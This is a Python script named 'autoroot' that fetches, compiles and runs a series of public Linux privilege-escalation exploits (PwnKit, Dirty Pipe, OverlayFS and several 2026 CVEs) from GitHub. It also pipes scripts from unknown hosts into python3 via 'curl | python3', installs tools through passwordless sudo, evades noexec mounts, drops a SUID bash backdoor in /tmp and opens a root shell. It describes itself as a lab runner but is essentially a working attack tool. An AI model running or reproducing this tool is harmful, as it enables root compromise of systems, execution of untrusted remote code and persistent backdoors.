#!/usr/bin/env python3
"""
autoroot - lab privilege-escalation runner.

Runs a set of public Linux privesc exploits in order, after basic
environment checks.  It is a dispatcher, not a magic root: each exploit
still depends on the exact kernel/distro/config, and a child process
cannot elevate the parent shell.  Run it on a disposable lab VM.

Usage:
  python3 autoroot.py --list
  python3 autoroot.py --yes
  python3 autoroot.py --yes --only pwnkit
  python3 autoroot.py --yes --allow-untrusted --labs
"""

from __future__ import annotations

import argparse
import os
import platform
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import textwrap
import time
from dataclasses import dataclass, field

# ---------------------------------------------------------------------------
# terminal
# ---------------------------------------------------------------------------

COLOR = sys.stdout.isatty()


def paint(text: str, code: str) -> str:
    return f"\033[{code}m{text}\033[0m" if COLOR else text


def ok(text: str) -> str:
    return paint(text, "92")


def bad(text: str) -> str:
    return paint(text, "91")


def warn(text: str) -> str:
    return paint(text, "93")


def info(text: str) -> str:
    return paint(text, "96")


def bold(text: str) -> str:
    return paint(text, "1")


def log(text: str) -> None:
    print(text, flush=True)


# ---------------------------------------------------------------------------
# environment
# ---------------------------------------------------------------------------

WORK = ""
CC = "gcc"
_COMPILER_CHECKED = False
TIMEOUT = int(os.environ.get("AUTOROOT_TIMEOUT", "45"))
DRY = False


def mount_options(path: str) -> str:
    best = None
    try:
        with open("/proc/mounts", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                parts = line.split()
                if len(parts) >= 4 and path.startswith(parts[1]):
                    if best is None or len(parts[1]) > len(best[0]):
                        best = (parts[1], parts[3])
    except OSError:
        pass
    return best[1] if best else ""


def find_workdir() -> str:
    candidates = []
    if os.environ.get("AUTOROOT_WORK"):
        candidates.append(os.environ["AUTOROOT_WORK"])
    home = os.path.expanduser("~")
    candidates += [
        os.path.join(home, ".cache", "autoroot"),
        "/dev/shm/autoroot",
        "/var/tmp/autoroot",
        "/tmp/autoroot",
    ]
    for base in candidates:
        try:
            os.makedirs(base, mode=0o700, exist_ok=True)
            if not os.access(base, os.W_OK | os.X_OK):
                continue
            opts = mount_options(base)
            if "noexec" in opts:
                continue
            path = tempfile.mkdtemp(prefix="run.", dir=base)
            os.chmod(path, 0o700)
            return path
        except OSError:
            continue
    # Last resort: a writable dir even if noexec (scripts can still run).
    return tempfile.mkdtemp(prefix="autoroot.")


def install_packages() -> bool:
    """Try to install a compiler/tools using passwordless sudo only."""
    if not shutil.which("sudo"):
        return False
    plans = []
    if shutil.which("apt-get"):
        plans.append(["sudo", "-n", "apt-get", "update"])
        plans.append(["sudo", "-n", "apt-get", "install", "-y",
                      "gcc", "build-essential", "git", "curl", "tar", "make"])
    elif shutil.which("dnf"):
        plans.append(["sudo", "-n", "dnf", "install", "-y",
                      "gcc", "make", "git", "curl", "tar"])
    elif shutil.which("yum"):
        plans.append(["sudo", "-n", "yum", "install", "-y",
                      "gcc", "make", "git", "curl", "tar"])
    elif shutil.which("apk"):
        plans.append(["sudo", "-n", "apk", "add", "--no-cache",
                      "gcc", "musl-dev", "make", "git", "curl", "tar"])
    elif shutil.which("pacman"):
        plans.append(["sudo", "-n", "pacman", "-Sy", "--noconfirm",
                      "gcc", "make", "git", "curl", "tar"])
    elif shutil.which("zypper"):
        plans.append(["sudo", "-n", "zypper", "install", "-y",
                      "gcc", "make", "git", "curl", "tar"])

    for cmd in plans:
        try:
            rc = subprocess.run(cmd, timeout=180).returncode
            if rc == 0 and (shutil.which("gcc") or shutil.which("cc")
                            or shutil.which("clang")):
                return True
        except (OSError, subprocess.TimeoutExpired):
            continue
    return False


def ensure_compiler() -> bool:
    global CC, _COMPILER_CHECKED
    if _COMPILER_CHECKED:
        return bool(shutil.which(CC))
    _COMPILER_CHECKED = True
    for candidate in ("gcc", "cc", "clang", "tcc"):
        if shutil.which(candidate):
            CC = candidate
            log(ok(f"  compiler: {CC}"))
            return True
    log(warn("  no C compiler; trying package manager (sudo -n)"))
    if install_packages():
        for candidate in ("gcc", "cc", "clang", "tcc"):
            if shutil.which(candidate):
                CC = candidate
                log(ok(f"  compiler installed: {CC}"))
                return True
    log(bad("  compiler unavailable; compile-based modules will skip"))
    return False


def ensure_tools() -> None:
    missing = [t for t in ("git", "curl", "tar", "make") if not shutil.which(t)]
    if missing:
        log(warn(f"  missing tools: {', '.join(missing)}; trying install"))
        install_packages()



def sh(cmd: str, desc: str = "", cwd: str | None = None,
       timeout: int | None = None) -> int:
    if desc:
        log(f"    {desc}")
    log(f"      $ {cmd}")
    if DRY:
        return 0

    def _run(command: str) -> int:
        try:
            return subprocess.run(
                ["bash", "-c", command],
                cwd=cwd or WORK,
                timeout=timeout if timeout is not None else TIMEOUT,
            ).returncode
        except subprocess.TimeoutExpired:
            log(bad(f"      timeout after {timeout or TIMEOUT}s"))
            return 124
        except FileNotFoundError as exc:
            log(bad(f"      {exc}"))
            return 127

    rc = _run(cmd)
    if rc == 126 and cmd.lstrip().startswith("./"):
        token = cmd.split()[0]
        src = os.path.join(cwd or WORK, token)
        if os.path.exists(src):
            for base in (os.path.expanduser("~/.cache/autoroot-exec"),
                         "/dev/shm/autoroot-exec"):
                try:
                    os.makedirs(base, mode=0o700, exist_ok=True)
                    if "noexec" in mount_options(base):
                        continue
                    dst = os.path.join(base, os.path.basename(src))
                    shutil.copy2(src, dst)
                    os.chmod(dst, 0o755)
                    retry = cmd.replace(token, dst, 1)
                    log(warn(f"      noexec/permission retry: {retry}"))
                    rc = _run(retry)
                    if rc != 126:
                        break
                except OSError:
                    continue
    return rc


def have(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def root() -> bool:
    return os.geteuid() == 0


def kernel_tuple():
    m = re.match(r"(\d+)\.(\d+)", platform.release())
    return (int(m.group(1)), int(m.group(2))) if m else (0, 0)


def in_kernel_range(low, high) -> bool:
    return low <= kernel_tuple() <= high


def os_release() -> dict:
    data = {}
    try:
        with open("/etc/os-release", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                if "=" in line:
                    k, v = line.rstrip().split("=", 1)
                    data[k] = v.strip('"')
    except OSError:
        pass
    return data


def distro_id() -> str:
    return os_release().get("ID", "").lower()


def has_suid(path: str | None) -> bool:
    if not path:
        return False
    try:
        return bool(os.stat(path).st_mode & stat.S_ISUID)
    except OSError:
        return False


def packagekit_present() -> bool:
    if not have("dpkg"):
        return False
    try:
        out = subprocess.run(["dpkg", "-l"], capture_output=True, text=True,
                             timeout=15).stdout.lower()
        return "packagekit" in out
    except (OSError, subprocess.TimeoutExpired):
        return False


def openvswitch_present() -> bool:
    if have("ovs-vsctl"):
        return True
    try:
        return "openvswitch" in open("/proc/modules", encoding="utf-8").read()
    except OSError:
        return False


# ---------------------------------------------------------------------------
# modules
# ---------------------------------------------------------------------------

@dataclass
class Module:
    key: str
    title: str
    check: str
    fn: callable
    untrusted: bool = False
    post: bool = False
    lab: bool = False
    ran: bool = False
    skipped: bool = False
    failed: bool = False


MODULES: list[Module] = []


def module(key, title, check, untrusted=False, post=False, lab=False):
    def deco(fn):
        MODULES.append(Module(key, title, check, fn, untrusted, post, lab))
        return fn
    return deco


@module("pwnkit", "PwnKit (CVE-2021-4034)", "pkexec SUID")
def m_pwnkit():
    pk = shutil.which("pkexec")
    if not pk or not has_suid(pk):
        log(warn("      pkexec yok veya SUID degil"))
        return False
    if not ensure_compiler():
        log(warn("      gcc yok"))
        return False
    sh("curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c", "download")
    sh(f"{CC} pwn.c -o pwn", "compile")
    sh("./pwn", "run")
    return True


@module("dirtypipe", "Dirty Pipe (CVE-2022-0847)", "kernel 5.8-5.16")
def m_dirtypipe():
    if not in_kernel_range((5, 8), (5, 16)):
        log(warn(f"      kernel {platform.release()} aralikta degil"))
        return False
    if not have("git") or not ensure_compiler():
        log(warn("      git/gcc yok"))
        return False
    sh("git clone --depth 1 https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git dirtypipe", "clone")
    sh(f"{CC} exploit.c -o exploit", "compile", cwd=os.path.join(WORK, "dirtypipe"))
    sh("./exploit", "run", cwd=os.path.join(WORK, "dirtypipe"))
    return True


@module("gameover", "GameOver(lay) (CVE-2023-2640/32629)", "Ubuntu + OverlayFS")
def m_gameover():
    if distro_id() not in ("ubuntu", "linuxmint"):
        log(warn(f"      distro {distro_id() or 'unknown'} uygun degil"))
        return False
    sh("curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh", "download")
    sh("chmod +x gameover.sh", "chmod")
    sh("./gameover.sh", "run")
    return True


@module("overlayfs", "OverlayFS (CVE-2023-0386)", "overlayfs + FUSE")
def m_overlayfs():
    try:
        fs = open("/proc/filesystems", encoding="utf-8").read()
    except OSError:
        fs = ""
    if "overlay" not in fs:
        log(warn("      overlayfs yok"))
        return False
    if not have("git") or not ensure_compiler():
        log(warn("      git/gcc yok"))
        return False
    sh("git clone --depth 1 https://github.com/xkaneiki/CVE-2023-0386.git overlayfs", "clone")
    sh(f"{CC} -o exp exp.c -lcap", "compile", cwd=os.path.join(WORK, "overlayfs"))
    sh("./exp", "run", cwd=os.path.join(WORK, "overlayfs"))
    return True


@module("dirtyfrag", "DirtyFrag", "kernel 6.1-6.6")
def m_dirtyfrag():
    if not in_kernel_range((6, 1), (6, 6)):
        log(warn(f"      kernel {platform.release()} aralikta degil"))
        return False
    if not have("git") or not ensure_compiler():
        log(warn("      git/gcc yok"))
        return False
    sh("git clone --depth 1 https://github.com/V4bel/dirtyfrag.git dirtyfrag", "clone")
    sh(f"{CC} -O0 -Wall -o exp exp.c -lutil", "compile", cwd=os.path.join(WORK, "dirtyfrag"))
    sh("./exp", "run", cwd=os.path.join(WORK, "dirtyfrag"))
    return True


@module("fragnesia", "FragNesia", "kernel 5.19-6.8")
def m_fragnesia():
    if not in_kernel_range((5, 19), (6, 8)):
        log(warn(f"      kernel {platform.release()} aralikta degil"))
        return False
    if not have("git") or not ensure_compiler():
        log(warn("      git/gcc yok"))
        return False
    sh("git clone --depth 1 https://github.com/v12-security/pocs.git pocs", "clone")
    d = os.path.join(WORK, "pocs", "fragnesia")
    sh(f"{CC} -o exp fragnesia.c", "compile", cwd=d)
    sh("./exp", "run", cwd=d)
    return True


@module("packagekit", "PackageKit RCE (CVE-2026-41651)", "PackageKit installed")
def m_packagekit():
    if not packagekit_present():
        log(warn("      PackageKit yok"))
        return False
    if not have("git"):
        log(warn("      git yok"))
        return False
    sh("git clone --depth 1 https://github.com/Vozec/CVE-2026-41651.git pk", "clone")
    d = os.path.join(WORK, "pk")
    sh("chmod +x cve-2026-41651", "chmod", cwd=d)
    sh("./cve-2026-41651", "run", cwd=d)
    return True


@module("ovswrap", "OVSwrap", "Open vSwitch")
def m_ovswrap():
    if not openvswitch_present():
        log(warn("      Open vSwitch yok"))
        return False
    if not have("git"):
        log(warn("      git yok"))
        return False
    sh("git clone --depth 1 https://github.com/manizada/OVSwrap.git ovswrap", "clone")
    sh("python3 ovswrap-poc.py", "run", cwd=os.path.join(WORK, "ovswrap"))
    return True


@module("cve2026_46300", "CVE-2026-46300 (unknown)", "public repo, unverified")
def m_46300():
    sh("git clone --depth 1 https://github.com/ExploitEoom/CVE-2026-46300.git cve46300", "clone")
    d = os.path.join(WORK, "cve46300")
    sh("chmod +x exploit", "chmod", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("diagspill", "DiagSpill", "repo, unknown")
def m_diagspill():
    sh("curl -fsSL https://github.com/manizada/DiagSpill/archive/refs/heads/main.tar.gz -o diagspill.tar.gz", "download")
    sh("tar xzf diagspill.tar.gz", "extract")
    d = os.path.join(WORK, "DiagSpill-main")
    if os.path.isdir(d):
        sh("make || true", "make", cwd=d)
        sh("if [ -x ./exploit ]; then ./exploit; elif [ -x ./run.sh ]; then ./run.sh; else ls -la; fi", "run", cwd=d)
    return True


@module("tunderflow", "TUNderflow", "repo, unknown")
def m_tunderflow():
    sh("curl -fsSL https://github.com/manizada/TUNderflow/archive/refs/heads/main.tar.gz -o tunderflow.tar.gz", "download")
    sh("tar xzf tunderflow.tar.gz", "extract")
    d = os.path.join(WORK, "TUNderflow-main")
    if os.path.isdir(d):
        sh("make || true", "make", cwd=d)
        sh("if [ -x ./exploit ]; then ./exploit; elif [ -x ./run.sh ]; then ./run.sh; else ls -la; fi", "run", cwd=d)
    return True


@module("cve2026_68138", "CVE-2026-68138", "repo, unknown", lab=True)
def m_68138():
    sh("git clone --depth 1 https://github.com/aramosf/CVE-2026-68138.git cve68138", "clone")
    d = os.path.join(WORK, "cve68138")
    sh("chmod +x build.sh", "chmod", cwd=d)
    sh("./build.sh", "build", cwd=d)
    sh("if [ -x ./exploit ]; then ./exploit; else ls -la; fi", "run", cwd=d)
    return True


@module("dirtydecrypt", "DirtyDecrypt (CVE-2026-31635)", "repo, unknown")
def m_dirtydecrypt():
    if not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/0xBlackash/DirtyDecrypt.git dirtydecrypt", "clone")
    d = os.path.join(WORK, "dirtydecrypt")
    sh(f"{CC} -O2 -static -pthread CVE-2026-31635.c -o DirtyDecrypt", "compile", cwd=d)
    sh("./DirtyDecrypt", "run", cwd=d)
    return True


@module("cybermeowfia", "CyberMeowfia (CVE-2026-52923)", "RHEL 6.12 lab")
def m_cybermeowfia():
    sh("git clone --depth 1 https://github.com/NebuSec/CyberMeowfia.git cybermeowfia", "clone")
    d = os.path.join(WORK, "cybermeowfia", "security-research",
                     "Linux-CVE-2026-52923-RHEL-6.12.0-211.7.3.el10_2")
    if not os.path.isdir(d):
        log(warn("      expected subdirectory not found"))
        return False
    sh("make", "make", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("cve2026_68398", "CVE-2026-68398", "repo, unknown")
def m_68398():
    if not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/aramosf/cve-2026-68398.git cve68398", "clone")
    d = os.path.join(WORK, "cve68398")
    sh(f"{CC} -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread", "compile", cwd=d)
    sh("./exploit", "run", cwd=d)
    return True


@module("pwnkit2", "PwnKit (second repo)", "pkexec SUID")
def m_pwnkit2():
    pk = shutil.which("pkexec")
    if not pk or not has_suid(pk):
        log(warn("      pkexec yok veya SUID degil"))
        return False
    if not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/Rvn0xsy/CVE-2021-4034.git pwnkit2", "clone")
    d = os.path.join(WORK, "pwnkit2")
    sh(f"{CC} cve-2021-4034.c -o exp", "compile", cwd=d)
    sh("./exp", "run", cwd=d)
    return True


@module("cve2026_64600", "CVE-2026-64600", "repo, unknown")
def m_64600():
    if not ensure_compiler():
        return False
    sh("git clone --depth 1 https://github.com/Debajyoti0-0/CVE-2026-64600.git cve64600", "clone")
    d = os.path.join(WORK, "cve64600")
    sh(f"{CC} -o cve-2026-64600 cve-2026-64600.c -lm -lpthread", "compile", cwd=d)
    sh("./cve-2026-64600", "run", cwd=d)
    return True


@module("untrusted_copyfail", "copy.fail remote script", "UNTRUSTED", untrusted=True)
def m_copyfail():
    if not UNTRUSTED:
        log(warn("      untrusted; use --allow-untrusted"))
        return False
    sh("curl -fsSL https://copy.fail/exp | python3", "run remote payload")
    return True


@module("untrusted_softechnology", "softechnology.biz remote script", "UNTRUSTED", untrusted=True)
def m_softechnology():
    if not UNTRUSTED:
        log(warn("      untrusted; use --allow-untrusted"))
        return False
    sh("curl -fsSL https://softechnology.biz/raw/OzJAt2aCfQ | python3", "run remote payload")
    return True


@module("mariadb_lab", "MariaDB 13 RCE lab", "docker lab, not privesc", lab=True)
def m_mariadb():
    if not have("docker"):
        log(warn("      docker yok"))
        return False
    sh("git clone --depth 1 https://github.com/dinosn/mariadb-13-rce-lab.git mariadb-lab", "clone")
    sh("docker compose up -d", "compose up", cwd=os.path.join(WORK, "mariadb-lab"))
    return True


@module("post_suid", "post: SUID bash", "only if already root", post=True)
def m_post():
    if not root():
        log(warn("      not root; post step skipped"))
        return False
    sh("cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash", "create SUID bash")
    log(ok("      /tmp/bash -p"))
    return True


@module("recon", "recon", "always")
def m_recon():
    sh("id; echo; sudo -n -l 2>&1 | head -40; echo; uname -a; echo; cat /etc/os-release | head -8", "recon")
    return True


# ---------------------------------------------------------------------------
# runner
# ---------------------------------------------------------------------------

UNTRUSTED = False


def run_module(mod: Module) -> None:
    log("")
    log(bold(f"[{mod.key}] {mod.title}"))
    log(f"  check: {mod.check}")
    if mod.untrusted and not UNTRUSTED:
        log(warn("  skipped: untrusted (--allow-untrusted)"))
        mod.skipped = True
        return
    if mod.post and not root():
        log(warn("  skipped: post step requires root"))
        mod.skipped = True
        return
    try:
        mod.ran = True
        applicable = mod.fn()
        if applicable is False:
            mod.skipped = True
    except KeyboardInterrupt:
        raise
    except Exception as exc:  # noqa: BLE001
        mod.failed = True
        log(bad(f"  error: {exc}"))
    if root():
        log(ok("  current process is root"))
        if sys.stdin.isatty():
            log(ok("  opening root shell..."))
            os.execv("/bin/bash", ["bash", "-p"])


def main(argv=None) -> int:
    global DRY, TIMEOUT, UNTRUSTED, WORK
    p = argparse.ArgumentParser(
        description="autoroot - lab privilege-escalation runner")
    p.add_argument("--yes", "-y", action="store_true",
                   help="confirm running the modules")
    p.add_argument("--dry-run", action="store_true",
                   help="print commands without running them")
    p.add_argument("--allow-untrusted", action="store_true",
                   help="allow curl | python3 payloads from unknown hosts")
    p.add_argument("--labs", action="store_true",
                   help="include lab/service modules (docker etc.)")
    p.add_argument("--only", help="run a single module key")
    p.add_argument("--list", action="store_true",
                   help="list modules and exit")
    p.add_argument("--timeout", type=int, default=TIMEOUT,
                   help=f"per-command timeout (default: {TIMEOUT}s, 0 = none)")
    args = p.parse_args(argv)

    if args.list:
        for mod in MODULES:
            flags = []
            if mod.untrusted:
                flags.append("untrusted")
            if mod.post:
                flags.append("post")
            if mod.lab:
                flags.append("lab")
            suffix = f" [{'/'.join(flags)}]" if flags else ""
            log(f"  {mod.key:<24} {mod.title}{suffix}")
        return 0

    if platform.system() != "Linux":
        log(bad("autoroot: Linux target required"))
        return 2

    DRY = args.dry_run
    TIMEOUT = args.timeout if args.timeout > 0 else 10 ** 9
    UNTRUSTED = args.allow_untrusted
    WORK = find_workdir()
    os.chmod(WORK, 0o700)
    ensure_tools()
    ensure_compiler()

    selected = [m for m in MODULES if not args.only or m.key == args.only]
    if args.only and not selected:
        log(bad(f"unknown module: {args.only}"))
        return 2
    if not args.only:
        selected = [
            m for m in selected
            if (args.labs or not m.lab)
            and (args.allow_untrusted or not m.untrusted)
        ]

    log(bold("autoroot - lab privilege-escalation runner"))
    log(f"user   : {os.getuid()} ({os.environ.get('USER', '?')})")
    log(f"kernel : {platform.release()}")
    log(f"distro : {distro_id() or 'unknown'}")
    log(f"work   : {WORK}")
    log("")

    if root():
        log(ok("Already root; running recon only."))
        m_recon()
        return 0

    if not args.dry_run:
        log("")
        log(info("running all safe modules (untrusted/lab/post skipped)"))
        log("")

    for mod in selected:
        run_module(mod)

    log("")
    log(bold("SUMMARY"))
    for mod in selected:
        if mod.ran and not mod.skipped and not mod.failed:
            state = ok("ran")
        elif mod.skipped:
            state = warn("skipped")
        elif mod.failed:
            state = bad("failed")
        else:
            state = warn("not run")
        log(f"  {mod.key:<24} {state}")
    log("")
    if not root():
        log(warn("Parent process is still unprivileged. A child exploit "
                 "cannot elevate this shell."))
        log("Use a module that leaves a SUID shell or run the exploit "
            "interactively.")
    return 0


if __name__ == "__main__":
    sys.exit(main())


